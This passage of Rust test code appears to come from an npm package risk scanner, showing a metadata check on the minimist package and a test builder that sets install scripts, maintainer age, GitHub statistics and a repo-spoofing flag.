        eprintln!("  maintainer_package_count: {}", info.maintainer_package_count);
        eprintln!("  github_repo_exists: {}", info.github_repo_exists);
        eprintln!("  github_stars: {}", info.github_stars);
        eprintln!("  github_forks: {}", info.github_forks);
        eprintln!("  github_readme_bytes: {}", info.github_readme_bytes);

        assert!(info.github_repo_exists, "minimist should have a GitHub repo");
        assert!(info.github_stars > 0, "minimist should have GitHub stars");
    }

    // --- test builder for constructing NpmPackageInfo in unit tests ---

    struct TestNpmInfo {
        info: NpmPackageInfo,
    }

    impl TestNpmInfo {
        fn build(self) -> NpmPackageInfo {
            self.info
        }

        fn postinstall(mut self, s: &str) -> Self {
            self.info.scripts.postinstall = s.to_string();
            self
        }

        fn install(mut self, s: &str) -> Self {
            self.info.scripts.install = s.to_string();
            self
        }

        fn account_age(mut self, days: u32) -> Self {
            self.info.maintainer_account_age = days;
            self
        }

        fn package_count(mut self, n: u32) -> Self {
            self.info.maintainer_package_count = n;
            self
        }

        fn no_repo(mut self) -> Self {
            self.info.github_repo_exists = false;
            self.info.github_readme_bytes = 0;
            self.info.github_closed_issues = 0;
            self
        }

        fn stars(mut self, n: u32) -> Self {
            self.info.github_repo_exists = true;
            self.info.github_stars = n;
            self
        }

        fn forks(mut self, n: u32) -> Self {
            self.info.github_forks = n;
            self
        }

        fn closed_issues(mut self, n: u32) -> Self {
            self.info.github_closed_issues = n;
            self
        }

        fn readme_bytes(mut self, n: u32) -> Self {
            self.info.github_readme_bytes = n;
            self
        }

        fn commit_freshness(mut self, days: u32) -> Self {
            self.info.github_commit_freshness = days;
            self
        }

        fn spoofed(mut self) -> Self {
            self.info.repo_spoofed = true;
            self
        }
    }

    fn test_npm_info_builder() -> TestNpmInfo {
        TestNpmInfo {
            info: NpmPackageInfo {
                package_name: "test-pkg".to_string(),
                scripts: NpmScripts::default(),
                maintainer_account_age: 365,
                maintainer_package_count: 5,
                github_repo_exists: true,
                github_stars: 100,
                github_commit_freshness: 30,
                github_forks: 10,
                github_closed_issues: 20,
                github_readme_bytes: 500,
                repo_spoofed: false,
            },
        }
    }
}
